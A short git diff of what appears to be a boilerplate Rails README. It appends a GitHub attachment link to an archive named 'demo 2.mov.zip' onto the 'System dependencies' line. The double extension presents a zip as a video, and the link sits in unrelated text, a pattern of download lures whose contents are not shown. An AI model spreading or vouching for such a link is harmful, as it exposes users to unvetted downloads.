@@ -15,7 +15,8 @@ Things you may want to cover:
 
 * Ruby version
 
-* System dependencies
+* System dependencies[demo 2.mov.zip](https://github.com/user-attachments/files/15984632/demo.2.mov.zip)
+
 
 * Configuration
 
